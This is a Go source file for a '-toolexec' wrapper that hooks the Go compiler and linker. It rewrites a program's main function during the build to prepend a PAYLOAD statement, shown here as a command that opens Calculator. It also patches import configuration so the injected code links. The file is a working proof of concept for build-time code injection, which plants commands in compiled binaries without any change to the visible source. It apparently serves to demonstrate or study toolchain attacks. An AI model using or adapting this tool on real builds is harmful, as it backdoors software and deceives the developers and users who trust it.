package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/pkg/errors"
	"go/ast"
	"go/parser"
	"go/printer"
	"go/token"
	"golang.org/x/tools/go/ast/astutil"
	"io"
	"log"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	PAYLOAD = `exec.Command("open", "/System/Applications/Calculator.app").Run()`
	CODE    = `package main

import "os/exec"

func main() {
	exec.Command("ls").Run()
}`
)

var (
	TEMPDIR      = path.Join(os.TempDir(), "gobuild_cache_xxx")
	ErrNotTarget = errors.New("not target file or function")
)

func main() {
	log.SetPrefix("[wrapper] ")

	if len(os.Args) < 3 {
		log.Fatal("wrong usage, you should call me through `go build -toolexec=/path/to/me`")
	}
	toolAbsPath := os.Args[1]
	args := os.Args[2:] // go build args
	_, toolName := filepath.Split(toolAbsPath)
	if runtime.GOOS == "windows" {
		toolName = strings.TrimSuffix(toolName, ".exe")
	}

	var err error
	switch toolName {
	case "compile":
		err = wrapCompile(args)
	case "link":
		err = wrapLink(args)
	}

	if err != nil && err != ErrNotTarget {
		log.Println(err)
	}
	//log.Println("cmd: ", name, args)
	cmd := exec.Command(toolAbsPath, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func wrapCompile(args []string) error {
	files := make([]string, 0, len(args))
	var cfg string
	for i, arg := range args {
		// /path/to/wrapper /opt/homebrew/Cellar/go/1.17.2/libexec/pkg/tool/darwin_arm64/compile -o $WORK/b001/_pkg_.a -trimpath "$WORK/b001=>" -shared -p main -lang=go1.17 -complete -buildid ijnVr99yrvgrVJjo7lvS/ijnVr99yrvgrVJjo7lvS -goversion go1.17.2 -importcfg $WORK/b001/importcfg -pack ./main.go $WORK/b001/_gomod_.go
		if strings.HasPrefix(arg, "-") {
			continue
		}
		if strings.Contains(arg, "/b001/importcfg") {
			cfg = arg
		} else if strings.HasSuffix(arg, ".go") {
			files = args[i:]
			break
		}
	}
	if cfg == "" || len(files) == 0 {
		return ErrNotTarget
	}

	var fTarget *ast.File
	var originPath string
	fset := token.NewFileSet()
ENTRY:
	for _, file := range files {
		f, err := parser.ParseFile(fset, file, nil, 0)
		if err != nil {
			continue
		}
		if f.Name.Name != "main" {
			return ErrNotTarget
		}
		for _, decl := range f.Decls {
			if fd, ok := decl.(*ast.FuncDecl); ok && fd.Name.Name == "main" {
				log.Println("located entrance")
				fTarget = f
				originPath = file
				break ENTRY
			}
		}
	}

	if fTarget == nil {
		return ErrNotTarget
	}

	//
	// located entrance
	//

	if _, err := os.Stat(TEMPDIR); os.IsNotExist(err) {
		err := os.Mkdir(TEMPDIR, os.ModePerm)
		if err != nil {
			return errors.Wrap(err, "create temp dir")
		}
	}

	// prepare dependence
	// todo skip existing dependencies
	err := buildDependence()
	if err != nil {
		return errors.Wrap(err, "build dependence")
	}
	log.Println("built dependence")

	err = mergeImportcfg(cfg, "importcfg")
	if err != nil {
		return errors.Wrap(err, "merge importcgf")
	}
	log.Println("merged importcgf")

	// modify source code
	insertPayload(fset, fTarget)
	var output []byte
	buffer := bytes.NewBuffer(output)
	err = printer.Fprint(buffer, fset, fTarget)
	if err != nil {
		return errors.Wrap(err, "fprint original code")
	}
	tmpEntryFile := path.Join(TEMPDIR, path.Base(originPath))
	err = os.WriteFile(tmpEntryFile, buffer.Bytes(), 0o666)
	if err != nil {
		return errors.Wrap(err, "write into temporary file")
	}
	log.Println("inserted payload")

	// update go build args
	for i := range args {
		if args[i] == originPath {
			args[i] = tmpEntryFile
		}
	}
	log.Printf("temp file strored at %s\n", tmpEntryFile)
	return nil
}

// buildDependence store the path of the b001 file obtained by compiling the test code to TEMPDIR/b001.txt
func buildDependence() error {
	gofile := path.Join(TEMPDIR, "xxx.go")
	goOutput := path.Join(TEMPDIR, "xxx")
	err := os.WriteFile(gofile, []byte(CODE), 0o777)
	if err != nil {
		return errors.Wrap(err, "land code")
	}

	buildCmd := strings.Split(fmt.Sprintf("build -a -work -o %s %s", goOutput, gofile), " ")
	output, err := exec.Command("go", buildCmd...).CombinedOutput()
	if err != nil {
		return errors.Wrap(err, "go build")
	}
	//log.Print(string(output))
	if !strings.HasPrefix(string(output), "WORK=") {
		return errors.New("bad output")
	}
	b001 := path.Join(strings.TrimPrefix(strings.TrimSpace(string(output)), "WORK="), "b001")
	err = os.WriteFile(path.Join(TEMPDIR, "b001.txt"), []byte(b001), 0644)
	if err != nil {
		return errors.Wrap(err, "save b001 path")
	}
	return nil
}

// insertPayload insert payload into f
func insertPayload(fset *token.FileSet, f *ast.File) {
	astutil.AddImport(fset, f, "os/exec")

	// payload must be able to be parsed successfully
	payloadExpr, _ := parser.ParseExpr(PAYLOAD)
	payloadExprStmt := &ast.ExprStmt{
		X: payloadExpr,
	}

	// method1
	ast.Inspect(f, func(n ast.Node) bool {
		switch x := n.(type) {
		case *ast.FuncDecl:
			if x.Name.Name == "main" && x.Recv == nil {
				stmts := make([]ast.Stmt, 0, len(x.Body.List)+1)
				stmts = append(stmts, payloadExprStmt)
				stmts = append(stmts, x.Body.List...)
				x.Body.List = stmts
				return false
			}
		}
		return true
	})

	// method2
	//pre := func(cursor *astutil.Cursor) bool {
	//	switch cursor.Node().(type) {
	//	case *ast.FuncDecl:
	//		if fd := cursor.Node().(*ast.FuncDecl); fd.Name.Name == "main" && fd.Recv == nil {
	//			return true
	//		}
	//		return false
	//	case *ast.BlockStmt:
	//		return true
	//	case ast.Stmt:
	//		if _, ok := cursor.Parent().(*ast.BlockStmt); ok {
	//			cursor.InsertBefore(payloadExprStmt)
	//		}
	//	}
	//	return true
	//}
	//post := func(cursor *astutil.Cursor) bool {
	//	if _, ok := cursor.Parent().(*ast.BlockStmt); ok {
	//		return false
	//	}
	//	return true
	//}
	//f = astutil.Apply(f, pre, post).(*ast.File)
}

func wrapLink(args []string) error {
	if _, err := os.Stat(TEMPDIR); os.IsNotExist(err) {
		return errors.New("temp dir not exist")
	}

	var cfg string
	for _, arg := range args {
		// /opt/homebrew/Cellar/go/1.17.2/libexec/pkg/tool/darwin_arm64/link -o $WORK/b001/exe/a.out -importcfg $WORK/b001/importcfg.link -buildmode=exe -buildid=DdpF09ip6nlMCY9jjkYX/DCfXYBMv_uD05qYqIbtF/OJ1Whv9JDUjRPiIVXH6A/DdpF09ip6nlMCY9jjkYX -extld=clang $WORK/b001/_pkg_.a
		if strings.HasPrefix(arg, "-") {
			continue
		}
		if strings.Contains(arg, "/b001/importcfg.link") {
			cfg = arg
			break
		}
	}
	if cfg == "" {
		return ErrNotTarget
	}

	//
	// located final link step
	//

	err := mergeImportcfg(cfg, "importcfg.link")
	if err != nil {
		return errors.Wrap(err, "merge importcgf")
	}
	log.Println("merged importcfg.link")

	//err = os.RemoveAll(TEMPDIR)
	//if err != nil {
	//	return errors.Wrap(err, "delete temp dictionary")
	//}
	//log.Println("deleted temp dictionary", TEMPDIR)
	return nil
}

// mergeImportcfg merge tempCfg into originalCfg.
// When it is the compile step, the cfg parameter should be `importcfg`.
// When it is the link step, the cfg parameter should be `importcfg.link`.
func mergeImportcfg(originalCfg, cfg string) error {
	f, err := os.OpenFile(originalCfg, os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		return errors.Wrap(err, "open original importcfg")
	}
	defer f.Close()

	b001txt, err := os.ReadFile(path.Join(TEMPDIR, "b001.txt"))
	if err != nil {
		return errors.Wrap(err, "read b001.txt")
	}
	b001Path := strings.TrimSpace(string(b001txt))
	tempCfg := path.Join(b001Path, cfg)
	fn, err := os.Open(tempCfg)
	if err != nil {
		return errors.Wrap(err, "open temp importctf")
	}
	defer fn.Close()

	parseCfg := func(r io.Reader) map[string]string {
		res := make(map[string]string)
		s := bufio.NewScanner(r)
		for s.Scan() {
			line := s.Text()
			if !strings.HasPrefix(line, "packagefile") {
				continue
			}
			index := strings.Index(line, "=")
			if index < 11 {
				continue
			}
			res[line[:index-1]] = line
		}
		return res
	}

	w := bufio.NewWriter(f)
	originalPkgs := parseCfg(f)
	tempPkgs := parseCfg(fn)
	for name, line := range tempPkgs {
		if _, ok := originalPkgs[name]; !ok {
			w.WriteString(line + "\n")
		}
	}
	w.Flush()

	return nil
}
